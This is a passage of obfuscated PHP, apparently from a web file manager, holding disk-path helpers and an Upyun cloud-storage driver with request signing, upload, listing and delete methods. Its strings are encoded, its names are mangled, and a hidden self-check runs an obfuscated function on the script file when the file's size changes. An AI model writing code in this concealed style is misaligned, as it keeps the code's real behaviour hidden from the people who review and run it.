$µš’ãÑÒ)) { continue; } $ŠÛ©½Û[] = $¢µ¾ù‘; } return $ŠÛ©½Û; } public static function isSameDisk($úÚÖ¡Ïİ, $ï‚Äøê“) { $¨¬µù¹ =& $_SERVER[¹Û¹Æ€]; if ($GLOBALS[$¨¬µù¹[16]][$¨¬µù¹[1294]] == $¨¬µù¹[1295]) { return strtolower(substr($úÚÖ¡Ïİ, 0, 1)) == strtolower(substr($ï‚Äøê“, 0, 1)); } $¸ıµöÍš = self::diskList(); $ÂÓı©à = !1; $ÍÙÙØ„å = !1; sort($¸ıµöÍš); $¸ıµöÍš = array_reverse($¸ıµöÍš); $úÚÖ¡Ïİ = rtrim($úÚÖ¡Ïİ, $¨¬µù¹[18]) . $¨¬µù¹[18]; $ï‚Äøê“ = rtrim($ï‚Äøê“, $¨¬µù¹[18]) . $¨¬µù¹[18]; foreach ($¸ıµöÍš as $úÃ³¨ˆƒ) { $à€“Ûƒ = strlen($úÃ³¨ˆƒ); if (!$ÂÓı©à && substr($úÚÖ¡Ïİ, 0, $à€“Ûƒ) == $úÃ³¨ˆƒ) { $ÂÓı©à = $úÃ³¨ˆƒ; } if (!$ÍÙÙØ„å && substr($ï‚Äøê“, 0, $à€“Ûƒ) == $úÃ³¨ˆƒ) { $ÍÙÙØ„å = $úÃ³¨ˆƒ; } if ($ÂÓı©à && $ÍÙÙØ„å) { break; } } return $ÂÓı©à === $ÍÙÙØ„å; } public static function transferType($Ä§Èê¯, $ü®ª¸Óé) { $­ñ³ÎøÕ =& $_SERVER[¹Û¹Æ€]; $¨€ºòÕ„ = self::driverType($Ä§Èê¯); $¥õ¿éã = self::driverType($ü®ª¸Óé); if ($¨€ºòÕ„[$­ñ³ÎøÕ[43]] == $¥õ¿éã[$­ñ³ÎøÕ[43]] && $¨€ºòÕ„[$­ñ³ÎøÕ[1309]] == $¥õ¿éã[$­ñ³ÎøÕ[1309]]) { return $­ñ³ÎøÕ[1310]; } if ($¨€ºòÕ„[$­ñ³ÎøÕ[43]] == $­ñ³ÎøÕ[866] && $¥õ¿éã[$­ñ³ÎøÕ[43]] == $­ñ³ÎøÕ[116]) { return $­ñ³ÎøÕ[1192]; } if ($¨€ºòÕ„[$­ñ³ÎøÕ[43]] == $­ñ³ÎøÕ[116] && $¥õ¿éã[$­ñ³ÎøÕ[43]] == $­ñ³ÎøÕ[866]) { return $­ñ³ÎøÕ[117]; } return $­ñ³ÎøÕ[1311]; } public static function driverType($Šëê±¦Ó) { $Ñ®ëœ± =& $_SERVER[¹Û¹Æ€]; $ÙË…Ä¾ô = str_replace($Ñ®ëœ±[1312], $Ñ®ëœ±[22], strtolower($Šëê±¦Ó->getType())); if ($ÙË…Ä¾ô == $Ñ®ëœ±[756] || $ÙË…Ä¾ô == $Ñ®ëœ±[1313] || $ÙË…Ä¾ô == $Ñ®ëœ±[1314]) { $Šëê±¦Ó = self::defaultDriverInit(); } else { if ($ÙË…Ä¾ô == $Ñ®ëœ±[1202] || $ÙË…Ä¾ô == $Ñ®ëœ±[1315]) { $Šëê±¦Ó = IO::init($Šëê±¦Ó->pathParse[$Ñ®ëœ±[1148]]); } } $†×¹¥¸æ = $Šëê±¦Ó->path; $ÙË…Ä¾ô = str_replace($Ñ®ëœ±[1312], $Ñ®ëœ±[22], strtolower($Šëê±¦Ó->getType())); if ($ÙË…Ä¾ô == $Ñ®ëœ±[116]) { return array($Ñ®ëœ±[43] => $Ñ®ëœ±[116], $Ñ®ëœ±[1309] => $Ñ®ëœ±[22], $Ñ®ëœ±[94] => $†×¹¥¸æ); } return array($Ñ®ëœ±[43] => $Ñ®ëœ±[866], $Ñ®ëœ±[1309] => $Šëê±¦Ó->pathDriver, $Ñ®ëœ±[94] => $†×¹¥¸æ); } public static function pathDriverType($•Šå£«¼) { return $•Šå£«¼ ? self::driverType(IO::init($•Šå£«¼)) : !1; } } goto Cîˆ¿µ‘’Ö; d¶âš¹…Ø•: $_SERVER[Ëü‚¼ê] = explode($_SERVER[¹Û¹Æ€][625], gzinflate(substr($_SERVER[¹Û¹Æ€][626], 10, -8))); $crwkdfyxlu = $_SERVER[¹Û¹Æ€][627]; if (strlen($crwkdfyxlu) < $_SERVER[¹Û¹Æ€][628]) { die; } goto dùÅ›˜Â; aÓÛÆ—¹æŠ: $_file = $_SERVER[$_SERVER[¹Û¹Æ€][6]]; $_size = $_SERVER[¹Û¹Æ€][7]; if ($_SERVER[$_SERVER[¹Û¹Æ€][8]] != $_size($_file)) { $_getc = $_SERVER[¹Û¹Æ€][9]; $_getfile = $_SERVER[$_SERVER[¹Û¹Æ€][10]] . $_SERVER[¹Û¹Æ€][11]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹Û¹Æ€][12], $_getfilec); if (count($_getarrs) < $_SERVER[¹Û¹Æ€][13]) { $exit = $_SERVER[¹Û¹Æ€][14]; $exit(); } $_act = $_SERVER[¹Û¹Æ€][15]; $_act($_file); } goto d¼Û ÅË‹ì; F”™±×÷äå: define($_SERVER[¹Û¹Æ€][0], $_SERVER[¹Û¹Æ€][1]); $_SERVER[Ÿéô¿ñÒ] = explode($_SERVER[¹Û¹Æ€][2], gzinflate(substr($_SERVER[¹Û¹Æ€][3], 10, -8))); function binCheckEq($ñèß¼ŞÕ, $×ƒÅÕ±) { return $ñèß¼ŞÕ == $×ƒÅÕ±; } goto BŒÀñ†Í¬; BÓÍ±ó«§¨: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\72\x2f\x2f\166\x30\x2e\141\160\151\x2e\x75\x70\x79\x75\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($“·Êù–¹) { parent::__construct(); $this->_init($“·Êù–¹); } public function _init($Î±‰Ä–‚) { $•›«Ü€­ =& $_SERVER[¹Û¹Æ€]; foreach ($Î±‰Ä–‚ as $®á‰—ÙÁ => $¢±÷î¶Ì) { if (isset($this->{$®á‰—ÙÁ})) { $this->{$®á‰—ÙÁ} = $¢±÷î¶Ì; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($•›«Ü€­[1459] . LNG($•›«Ü€­[1390])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($·®Ô…·Æ, $ŸºªÖ«ğ = "\107\x45\x54") { $úôš«— =& $_SERVER[¹Û¹Æ€]; $’´Õ‚œÜ = gmdate($úôš«—[1423]); $­°û‚§† = base64_encode(hash_hmac($úôš«—[1460], "{$ŸºªÖ«ğ}\46{$·®Ô…·Æ}\46{$’´Õ‚œÜ}", md5("{$this->userpass}"), !0)); $›Æ“Ñû = array("\101\165\x74\x68\x6f\162\x69\x7a\141\x74\151\157\x6e\72\125\x50\131\x55\116\x20{$this->username}\72{$­°û‚§†}", "\104\141\164\145\72{$’´Õ‚œÜ}"); return $›Æ“Ñû; } public function ussRequest($¼¼£æ©Ã, $Á¥¨«Ì = "\107\105\124", $Á„€ó×˜ = false, $–ÙêÑ­× = false, $Á¬Ì£¼€ = false) { $³š¥´•Š =& $_SERVER[¹Û¹Æ€]; $¼¼£æ©Ã = trim($¼¼£æ©Ã, $³š¥´•Š[18]); $¾ø—ˆÀ = "\x2f{$this->bucket}\57{$¼¼£æ©Ã}"; $Ì‚¦ô¸Õ = $this->ussHeaders($¾ø—ˆÀ, $Á¥¨«Ì); if ($–ÙêÑ­×) { $Ì‚¦ô¸Õ = array_merge($Ì‚¦ô¸Õ, $–ÙêÑ­×); } $¦âÄ´ê = url_request($this->endpoint . $¾ø—ˆÀ, $Á¥¨«Ì, $Á„€ó×˜, $Ì‚¦ô¸Õ, $Á¬Ì£¼€); if (!$¦âÄ´ê) { return array($³š¥´•Š[1210] => !1, $³š¥´•Š[1200] => $³š¥´•Š[1461]); } if (strtolower($Á¥¨«Ì) == $³š¥´•Š[206] || in_array($¦âÄ´ê[$³š¥´•Š[1210]], array($³š¥´•Š[1316], $³š¥´•Š[1462]))) { $Á„€ó×˜ = $¦âÄ´ê[$³š¥´•Š[1463]]; } else { $Á„€ó×˜ = json_decode($¦âÄ´ê[$³š¥´•Š[1200]], !0); if (!$Á„€ó×˜) { $Á„€ó×˜ = $¦âÄ´ê[$³š¥´•Š[1200]]; } else { if (!$¦âÄ´ê[$³š¥´•Š[748]] && isset($Á„€ó×˜[$³š¥´•Š[1464]])) { $Á„€ó×˜ = $Á„€ó×˜[$³š¥´•Š[1464]]; } } } return array($³š¥´•Š[1210] => $¦âÄ´ê[$³š¥´•Š[748]], $³š¥´•Š[1200] => $Á„€ó×˜); } public function mkfile($…ÎŠ»ùÖ, $´ˆóñ¾Ğ = '', $Ú…àË° = REPEAT_RENAME) { if ($this->setContent($…ÎŠ»ùÖ, $´ˆóñ¾Ğ)) { return $this->getPathOuter($…ÎŠ»ùÖ); } return !1; } public function mkdir($µğĞùö§, $Ïüè¥ûô = REPEAT_SKIP) { $ÖÓ›¡Â =& $_SERVER[¹Û¹Æ€]; $°É¦…š˜ = trim($µğĞùö§, $ÖÓ›¡Â[18]); if ($this->_isFolder($°É¦…š˜)) { return $this->getPathOuter($°É¦…š˜); } $¿õûìÃ® = array($ÖÓ›¡Â[1465]); $€Øå‰¶ = $this->ussRequest($°É¦…š˜, $ÖÓ›¡Â[236], !1, $¿õûìÃ®); return $€Øå‰¶[$ÖÓ›¡Â[1210]] ? $this->getPathOuter($°É¦…š˜) : !1; } public function copyFile($­ƒĞ§—í, $ŸÙ‘õ—Ç) { $«…Ÿâ¬· =& $_SERVER[¹Û¹Æ€]; $Ä¸ÔĞ§ë = array($«…Ÿâ¬·[1466] . "\x2f{$this->bucket}\x2f{$­ƒĞ§—í}", $«…Ÿâ¬·[1467]); $ÓœÙğ¹® = $this->ussRequest($ŸÙ‘õ—Ç, $«…Ÿâ¬·[238], !1, $Ä¸ÔĞ§ë); return $ÓœÙğ¹®[$«…Ÿâ¬·[1210]] ? !0 : $this->getPathOuter($ŸÙ‘õ—Ç); } public function moveFile($§šƒª», $ñˆä›¤) { $¶ìşÎ¼Ñ =& $_SERVER[¹Û¹Æ€]; $·¤§ÅÆ = array($¶ìşÎ¼Ñ[1468] . "\57{$this->bucket}\57{$§šƒª»}", $¶ìşÎ¼Ñ[1467]); $”àÏ°£ = $this->ussRequest($ñˆä›¤, $¶ìşÎ¼Ñ[238], !1, $·¤§ÅÆ); return $”àÏ°£[$¶ìşÎ¼Ñ[1210]] ? !0 : $this->getPathOuter($ñˆä›¤); } public function delFile($ğ“†˜®ü) { $¤³ÇŞëì =& $_SERVER[¹Û¹Æ€]; $ÉÏËôéÑ = $this->ussRequest($ğ“†˜®ü, $¤³ÇŞëì[1469]); return $ÉÏËôéÑ[$¤³ÇŞëì[1210]] ? !0 : !1; } public function delFolder($¬Õıí›) { $Î‚ª’İà =& $_SERVER[¹Û¹Æ€]; if (!$this->exist($¬Õıí›)) { return !0; } $this->listItemCache = !1; $úîÁíõ = $â°«Ë˜Â = array(); $this->fileList($¬Õıí›, $úîÁíõ, $â°«Ë˜Â, !0); $this->listItemCache = !0; foreach ($â°«Ë˜Â as $Ãºñ£ÕÅ) { $Õø„›™÷ = $this->ussRequest($Ãºñ£ÕÅ[$Î‚ª’İà[42]], $Î‚ª’İà[1469]); if (!$Õø„›™÷[$Î‚ª’İà[1210]]) { return !1; } } foreach ($úîÁíõ as $’ î“Ó) { $Õø„›™÷ = $this->ussRequest($’ î“Ó, $Î‚ª’İà[1469]); if (!$Õø„›™÷[$Î‚ª’İà[1210]]) { return !1; } } $Õø„›™÷ = $this->ussRequest($¬Õıí›, $Î‚ª’İà[1469]); return $Õø„›™÷[$Î‚ª’İà[1210]]; } public function rename($âÒ‰µÖº, $§ÁÉ¸£Ú) { if ($this->isFile($âÒ‰µÖº)) { $§ÁÉ¸£Ú = get_path_father($âÒ‰µÖº) . $§ÁÉ¸£Ú; return $this->moveFile($âÒ‰µÖº, $§ÁÉ¸£Ú); } return $this->renameObject($âÒ‰µÖº, $§ÁÉ¸£Ú); } public function fileInfo($ö‹ßÕ‰, $Òİƒ ñ = false, $á²—ù = array()) { $Æˆ ìÉ =& $_SERVER[¹Û¹Æ€]; $¸Ô´Êï÷ = array($Æˆ ìÉ[42] => $this->pathThis($ö‹ßÕ‰), $Æˆ ìÉ[94] => $this->getPathOuter($Æˆ ìÉ[18] . $ö‹ßÕ‰), $Æˆ ìÉ[43] => $Æˆ ìÉ[209], $Æˆ ìÉ[86] => isset($á²—ù[$Æˆ ìÉ[86]]) ? $á²—ù[$Æˆ ìÉ[86]] : 0, $Æˆ ìÉ[184] => $this->ext($ö‹ßÕ‰)); if ($Òİƒ ñ) { return $¸Ô´Êï÷; } $¸Ô´Êï÷[$Æˆ ìÉ[210]] = $¸Ô´Êï÷[$Æˆ ìÉ[95]] = 0; $¸Ô´Êï÷[$Æˆ ìÉ[211]] = $¸Ô´Êï÷[$Æˆ ìÉ[212]] = !0; if (empty($á²—ù)) { $á²—ù = $this->objectMeta($ö‹ßÕ‰); if (!$á²—ù) { return $¸Ô´Êï÷; } } $¸Ô´Êï÷[$Æˆ ìÉ[210]] = intval($á²—ù[$Æˆ ìÉ[1470]]); $¸Ô´Êï÷[$Æˆ ìÉ[95]] = intval($á²—ù[$Æˆ ìÉ[1471]]); $¸Ô´Êï÷[$Æˆ ìÉ[86]] = $á²—ù[$Æˆ ìÉ[86]]; return $¸Ô´Êï÷; } public function folderInfo($ûşÅ˜ÈÀ, $ŸêÙ»”— = false) { $í×äâ‹ä =& $_SERVER[¹Û¹Æ€]; $€ßÕÜòƒ = array($í×äâ‹ä[42] => $this->pathThis($ûşÅ˜ÈÀ), $í×äâ‹ä[94] => $this->getPathOuter($í×äâ‹ä[18] . $ûşÅ˜ÈÀ), $í×äâ‹ä[43] => $í×äâ‹ä[85]); if ($ŸêÙ»”—) { return $€ßÕÜòƒ; } $€ßÕÜòƒ[$í×äâ‹ä[210]] = $€ßÕÜòƒ[$í×äâ‹ä[95]] = 0; $€ßÕÜòƒ[$í×äâ‹ä[211]] = $€ßÕÜòƒ[$í×äâ‹ä[212]] = !0; if (empty($¯Èµ«Ç‰)) { $¯Èµ«Ç‰ = $this->objectMeta($ûşÅ˜ÈÀ); if (!$¯Èµ«Ç‰) { return $€ßÕÜòƒ; } } $€ßÕÜòƒ[$í×äâ‹ä[210]] = intval($¯Èµ«Ç‰[$í×äâ‹ä[1470]]); $€ßÕÜòƒ[$í×äâ‹ä[95]] = intval($¯Èµ«Ç‰[$í×äâ‹ä[1471]]); return $€ßÕÜòƒ; } private function listObjs($—…ÜÃ×Ğ, $ˆøÔ›ğ = 0, $è•´Ö = 1000) { $ÎËÎ™¯ñ =& $_SERVER[¹Û¹Æ€]; $èÃ¡Ùš¬ = array($ÎËÎ™¯ñ[1472], $ÎËÎ™¯ñ[1473] . $è•´Ö); if ($ˆøÔ›ğ) { $èÃ¡Ùš¬[] = $ÎËÎ™¯ñ[1474] . $ˆøÔ›ğ; } $„¶ÒŸ€î = $this->ussRequest($—…ÜÃ×Ğ, $ÎËÎ™¯ñ[240], !1, $èÃ¡Ùš¬); return !$„¶ÒŸ€î[$ÎËÎ™¯ñ[1210]] ? !1 : $„¶ÒŸ€î[$ÎËÎ™¯ñ[1200]]; } private function fileList($‹—Óğğ¶, &$Ú·¾§ü, &$¡œà”¿, $‹µÎ¿»ß = false) { $Ë¨ÊëÔ =& $_SERVER[¹Û¹Æ€]; $î²ôÂ›ƒ = $Ë¨ÊëÔ[22]; $„÷øØµÌ = 1000; $ôİÚ”ƒ¦ = rtrim($‹—Óğğ¶, $Ë¨ÊëÔ[18]) . $Ë¨ÊëÔ[18]; while (!0) { check_abort(); $ùä¨ÁøØ = $this->listObjs($‹—Óğğ¶, $î²ôÂ›ƒ, $„÷øØµÌ); if (!$ùä¨ÁøØ) { return !1; } $î²ôÂ›ƒ = isset($ùä¨ÁøØ[$Ë¨ÊëÔ[1475]]) ? $ùä¨ÁøØ[$Ë¨ÊëÔ[1475]] : $Ë¨ÊëÔ[22]; $¼ú×ä˜¨ = isset($ùä¨ÁøØ[$Ë¨ÊëÔ[1476]]) ? $ùä¨ÁøØ[$Ë¨ÊëÔ[1476]] : array(); foreach ($¼ú×ä˜¨ as $ó²¤Ùöä) { $ËÆêÌ†˜ = $ó²¤Ùöä[$Ë¨ÊëÔ[43]] == $Ë¨ÊëÔ[85] ? !0 : !1; $æ“’µæÏ = ltrim($ôİÚ”ƒ¦ . $ó²¤Ùöä[$Ë¨ÊëÔ[42]], $Ë¨ÊëÔ[18]) . ($ËÆêÌ†˜ ? $Ë¨ÊëÔ[18] : $Ë¨ÊëÔ[22]); $¨ƒ•Âæ = array($Ë¨ÊëÔ[42] => $æ“’µæÏ, $Ë¨ÊëÔ[43] => $ËÆêÌ†˜ ? $Ë¨ÊëÔ[85] : $Ë¨ÊëÔ[209], $Ë¨ÊëÔ[86] => $ó²¤Ùöä[$Ë¨ÊëÔ[346]], $Ë¨ÊëÔ[1471] => $ó²¤Ùöä[$Ë¨ÊëÔ[1477]]); $this->cacheMethodInfoSet($æ“’µæÏ, $ËÆêÌ†˜, $¨ƒ•Âæ); if ($ËÆêÌ†˜) { $Ú·¾§ü[] = $æ“’µæÏ; if ($‹µÎ¿»ß) { $this->fileList($æ“’µæÏ, $Ú·¾§ü, $¡œà”¿, $‹µÎ¿»ß); } continue; } $¡œà”¿[] = $¨ƒ•Âæ; } if (count($¼ú×ä˜¨) < $„÷øØµÌ) { break; } } $this->cacheMethodInfoSet($‹—Óğğ¶, !0); } public function listPath($şÆ‚², $Õ¥†À = false) { $ÉŸàÅê =& $_SERVER[¹Û¹Æ€]; $Â’şæ„¥ = $î‘ˆƒ×Á = array(); $this->fileList($şÆ‚², $Â’şæ„¥, $î‘ˆƒ×Á); foreach ($Â’şæ„¥ as $ÓèÇê¼« => $¢óÊşõÎ) { $Â’şæ„¥[$ÓèÇê¼«] = $this->folderInfo($¢óÊşõÎ, $Õ¥†À); } foreach ($î‘ˆƒ×Á as $ÓèÇê¼« => $¢óÊşõÎ) { $î‘ˆƒ×Á[$ÓèÇê¼«] = $this->fileInfo($¢óÊşõÎ[$ÉŸàÅê[42]], $Õ¥†À, $¢óÊşõÎ); } return array($ÉŸàÅê[92] => $Â’şæ„¥, $ÉŸàÅê[93] => $î‘ˆƒ×Á); } public function has($ÒñæŸ’, $ÛóÀ´ñ³ = false, $°¶¹¤›Ğ = true) { $‘©½¯ =& $_SERVER[¹Û¹Æ€]; $«Ú¾û× = $‘©½¯[22]; $—†»éğÀ = 500; $¶²­›€ = 0; $»İ†É…û = 0; $§õ–¼± = rtrim($ÒñæŸ’, $‘©½¯[18]) . $‘©½¯[18]; while (!0) { check_abort(); $äöø® Ø = $this->listObjs($ÒñæŸ’, $«Ú¾û×, $—†»éğÀ); if (!$äöø® Ø) { return !1; } $«Ú¾û× = isset($äöø® Ø[$‘©½¯[1475]]) ? $äöø® Ø[$‘©½¯[1475]] : $‘©½¯[22]; $îôÜ™ßê = isset($äöø® Ø[$‘©½¯[1476]]) ? $äöø® Ø[$‘©½¯[1476]] : array(); if (empty($îôÜ™ßê)) { break; } $é¤¢¿¹ = array_filter($îôÜ™ßê, function ($îÓ˜ÎÀÃ) { $Íğ¬Ìü =& $_SERVER[¹Û¹Æ€]; return $îÓ˜ÎÀÃ[$Íğ¬Ìü[43]] == $Íğ¬Ìü[85]; }); $¢«ÛäÛ¼ = count($îôÜ™ßê); $é¤¢¿¹ = count($é¤¢¿¹); $İÒØ¼şÉ = $¢«ÛäÛ¼ - $é¤¢¿¹; if ($ÛóÀ´ñ³) { $»İ†É…û += $é¤¢¿¹; $¶²­›€ += $İÒØ¼şÉ; if ($¢«ÛäÛ¼ < $—†»éğÀ) { break; } continue; } if ($°¶¹¤›Ğ) { if ($İÒØ¼şÉ) { return !0; } } else { if ($é¤¢¿¹) { return !0; } } if ($¢«ÛäÛ¼ < $—†»éğÀ) { break; } } if ($ÛóÀ´ñ³) { return array($‘©½¯[217] => $¶²­›€, $‘©½¯[218] => $»İ†É…û); } return !1; } public function listAll($¼æ‘ùı¡) { $„ĞÍ =& $_SERVER[¹Û¹Æ€]; $ÄÛÎæÓ = $¦®™ü²» = array(); $this->fileList($¼æ‘ùı¡, $ÄÛÎæÓ, $¦®™ü²», !0); $¿øœÈ» = array(); foreach ($¦®™ü²» as $ìÜš¸”) { $¿øœÈ»[$ìÜš¸”[$„ĞÍ[42]]] = $ìÜš¸”[$„ĞÍ[86]]; } foreach ($ÄÛÎæÓ as $ìÜš¸”) { if (is_string($ìÜš¸”)) { $¿øœÈ»[$ìÜš¸”] = 0; } } return $this->listAllFiles($¼æ‘ùı¡, array_keys($¿øœÈ»), $¿øœÈ»); } public function canRead($­¢ş…Úî) { return $this->exist($­¢ş…Úî) ? !0 : !1; } public function canWrite($ÔÒ²ü–Ã) { return $this->exist($ÔÒ²ü–Ã) ? !0 : !1; } public function getContent($ÇıúıÔ) { return $this->fileSubstr($ÇıúıÔ, 0, -1); } public function setContent($šÖÉè¾ã, $âù÷àŸ = '') { $ğÖËíì„ =& $_SERVER[¹Û¹Æ€]; if (!$âù÷àŸ) { $“¼ÛæÓ = $this->ussRequest($šÖÉè¾ã, $ğÖËíì„[236]); return $“¼ÛæÓ[$ğÖËíì„[1210]]; } $÷Ëé³Å— = $this->tempFile($this->pathThis($šÖÉè¾ã)); file_put_contents($÷Ëé³Å—, $âù÷àŸ); if ($this->upload($šÖÉè¾ã, $÷Ëé³Å—)) { $this->tempFileRemve($÷Ëé³Å—); return !0; } return !1; } public function fileSubstr($•ù¨Ìµ, $ú»¢™ûÜ, $šÜğãß) { $‹œû—¢• =& $_SERVER[¹Û¹Æ€]; if (!($ï…ÑåÛ¯ = $this->link($•ù¨Ìµ))) { return !1; } $Ş¿ÊŸÈè = !1; if ($šÜğãß > 0) { $®Íöı«İ = $ú»¢™ûÜ + $šÜğãß - 1; $Ş¿ÊŸÈè = array($‹œû—¢•[1438] . $ú»¢™ûÜ . $‹œû—¢•[395] . $®Íöı«İ); } $øÌÆáÅ¾ = url_request($ï…ÑåÛ¯, $‹œû—¢•[240], !1, $Ş¿ÊŸÈè); return $øÌÆáÅ¾[$‹œû—¢•[748]] ? $øÌÆáÅ¾[$‹œû—¢•[1200]] : !1; } public function upload($ıˆïÂÆ¯, $££ï½Ø, $öÔû¯Ò¹ = false, $–š˜¼òÖ = REPEAT_REPLACE) { $Ç¾¶ŠÀ =& $_SERVER[¹Û¹Æ€]; $Ìä‚•¼ = IO::size($££ï½Ø); if ($Ìä‚•¼ <= 1024 * 1024 * 200) { $¢²…œ¡ = array($Ç¾¶ŠÀ[1478] . $££ï½Ø); $†º–÷²ğ = $this->ussRequest($ıˆïÂÆ¯, $Ç¾¶ŠÀ[238], $¢²…œ¡); return $†º–÷²ğ[$Ç¾¶ŠÀ[1210]] ? $this->getPathOuter($ıˆïÂÆ¯) : !1; } $£ÅÍÍ„Ş = 1024 * 1024 * 10; $¥²ê“¿ó = array($Ç¾¶ŠÀ[1479], $Ç¾¶ŠÀ[1480] . $Ìä‚•¼, $Ç¾¶ŠÀ[1481], $Ç¾¶ŠÀ[1482] . $£ÅÍÍ„Ş); $†º–÷²ğ = $this->ussRequest($ıˆïÂÆ¯, $Ç¾¶ŠÀ[238], !1, $¥²ê“¿ó); if (!$†º–÷²ğ[$Ç¾¶ŠÀ[1210]]) { return !1; } $­†éÊ¿û = $†º–÷²ğ[$Ç¾¶ŠÀ[1200]]; $Àì¡¤ª© = 0; $˜Ò¨õñá = $­†éÊ¿û[$Ç¾¶ŠÀ[1483]]; $ƒ°ààº¯ = fopen($££ï½Ø, $Ç¾¶ŠÀ[1387]); if (!$ƒ°ààº¯) { return !1; } do { $„Ãƒµ§€ = $­†éÊ¿û[$Ç¾¶ŠÀ[1484]]; fseek_64($ƒ°ààº¯, $Àì¡¤ª©); $Çæ·èà© = fread($ƒ°ààº¯, $„Ãƒµ§€); $Ø÷¾û± = 0; do { $Ø÷¾û±++; $­†éÊ¿û = $this->uploadPart($ıˆïÂÆ¯, $­†éÊ¿û, $Çæ·èà©); } while (!$­†éÊ¿û && $Ø÷¾û± < 3); if (!$­†éÊ¿û) { return !1; } $˜Ò¨õñá = $­†éÊ¿û[$Ç¾¶ŠÀ[1483]]; $Àì¡¤ª© += $„Ãƒµ§€; } while ($˜Ò¨õñá != -1); fclose($ƒ°ààº¯); $¥²ê“¿ó = array($Ç¾¶ŠÀ[1485], $Ç¾¶ŠÀ[1486] . $­†éÊ¿û[$Ç¾¶ŠÀ[1487]], $Ç¾¶ŠÀ[1481]); $†º–÷²ğ = $this->ussRequest($ıˆïÂÆ¯, $Ç¾¶ŠÀ[238], !1, $¥²ê“¿ó); return $†º–÷²ğ[$Ç¾¶ŠÀ[1210]] ? $this->getPathOuter($ı“©®•ò) : !1; } private function uploadPart($µÇÎ¤Äğ, $­ºœ­˜š, &$´Â”Å´) { $Ì§ÍÑÒ‹ =& $_SERVER[¹Û¹Æ€]; $ê”šğ¢Ğ = array($Ì§ÍÑÒ‹[1488], $Ì§ÍÑÒ‹[1486] . $­ºœ­˜š[$Ì§ÍÑÒ‹[1487]], $Ì§ÍÑÒ‹[1489] . $­ºœ­˜š[$Ì§ÍÑÒ‹[1483]], $Ì§ÍÑÒ‹[152] . $­ºœ­˜š[$Ì§ÍÑÒ‹[1484]]); $Ñ”âß = $this->ussRequest($µÇÎ¤Äğ, $Ì§ÍÑÒ‹[238], $´Â”Å´, $ê”šğ¢Ğ); return !$Ñ”âß[$Ì§ÍÑÒ‹[1210]] ? $Ñ”âß[$Ì§ÍÑÒ‹[1210]] : $Ñ”âß[$Ì§ÍÑÒ‹[1200]]; } public function uploadFormData($ÈÂìü¶í, $ÕÖìˆ·Š = 3600) { return $this->uploadPolicy($ÈÂìü¶í, $ÕÖìˆ·Š); } public function multiUploadFormData($®òÏ½İÒ, $ïå–ğ—Ó = 3600) { $¯Î£¶÷Ñ =& $_SERVER[¹Û¹Æ€]; $§ÜÅÅŞú = (int) $GLOBALS[$¯Î£¶÷Ñ[17]][$¯Î£¶÷Ñ[86]]; return $this->uploadPolicy($®òÏ½İÒ, $ïå–ğ—Ó, $§ÜÅÅŞú); } private function uploadPolicy($»Ú¶Èş¢, $•ë¹Ï­ = 3600, $÷Ãº±ÜÔ = 0) { $Ï˜ÑÚÕÌ =& $_SERVER[¹Û¹Æ€]; $µí˜Ó› = $Ï˜ÑÚÕÌ[18] . $this->bucket; $â¶ªÁğ‡ = gmdate($Ï˜ÑÚÕÌ[1423]); $§Â‚³Éë = array($Ï˜ÑÚÕÌ[1490] => $this->bucket, $Ï˜ÑÚÕÌ[1491] => $»Ú¶Èş¢, $Ï˜ÑÚÕÌ[1492] => time() + $•ë¹Ï­, $Ï˜ÑÚÕÌ[1493] => $â¶ªÁğ‡); if ($÷Ãº±ÜÔ) { $§Â‚³Éë[$Ï˜ÑÚÕÌ[1403]] = $÷Ãº±ÜÔ; } $€¾ûÄş = base64_encode(json_encode($§Â‚³Éë)); $Œµ¢ƒ„ = base64_encode(hash_hmac($Ï˜ÑÚÕÌ[1460], "\x50\117\x53\124\46{$µí˜Ó›}\x26{$â¶ªÁğ‡}\46{$€¾ûÄş}", md5("{$this->userpass}"), !0)); $ê…•É½ = array($Ï˜ÑÚÕÌ[1328] => $€¾ûÄş, $Ï˜ÑÚÕÌ[1494] => "\x55\x50\x59\x55\x4e\40{$this->username}\x3a{$Œµ¢ƒ„}", $Ï˜ÑÚÕÌ[191] => $this->endpoint . $µí˜Ó›); return $ê…•É½; } public function download($Ú‰çÎÊ¬, $Éáåß®¿) { $Œ”ú´ Ø = IO::getPathInner(IO::mkfile($Éáåß®¿)); if (!($ê™†ÆŞá = $this->link($Ú‰çÎÊ¬))) { return !1; } $ÑŸ¡Óè€ = 0; $×Å¾¼†† = 1024 * 200; $ı‡¦¡Œ´ = fopen($Œ”ú´ Ø, $_SERVER[¹Û¹Æ€][1444]); while (!0) { $‚¶¨Æè = $this->fileSubstr($Ú‰çÎÊ¬, $ÑŸ¡Óè€, $×Å¾¼††); if ($‚¶¨Æè === !1) { return !1; } fwrite($ı‡¦¡Œ´, $‚¶¨Æè); $ÑŸ¡Óè€ += $×Å¾¼††; if (strlen($‚¶¨Æè) < $×Å¾¼††) { break; } } fclose($ı‡¦¡Œ´); return $Éáåß®¿; } public function link($¶üÎáöí, $Ñ¡ÀÑ—ñ = array()) { $ïù¼½± =& $_SERVER[¹Û¹Æ€]; $¶üÎáöí = trim($¶üÎáöí, $ïù¼½±[18]); if (!empty($this->token)) { $ã¼éÒ = strtotime(date($ïù¼½±[1495])); $‡å”®’ˆ = substr(md5($this->token . $ïù¼½±[293] . $ã¼éÒ . $ïù¼½±[1496] . $¶üÎáöí), 12, 8) . $ã¼éÒ; $Ñ¡ÀÑ—ñ[] = $ïù¼½±[1497] . $‡å”®’ˆ; } $ƒÒËº‚¶ = !empty($Ñ¡ÀÑ—ñ) ? $ïù¼½±[83] . implode($ïù¼½±[293], $Ñ¡ÀÑ—ñ) : $ïù¼½±[22]; return $this->getHost() . $ïù¼½±[18] . $¶üÎáöí . $ƒÒËº‚¶; } public function fileOut($ƒ¼˜«¦ı, $Ğä†áÎå = false, $‚‹ÜÉ… = false, $ª£‰ˆ†ø = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ƒ¼˜«¦ı, $Ğä†áÎå, $‚‹ÜÉ…, $ª£‰ˆ†ø); } if (!$‚‹ÜÉ…) { $‚‹ÜÉ… = 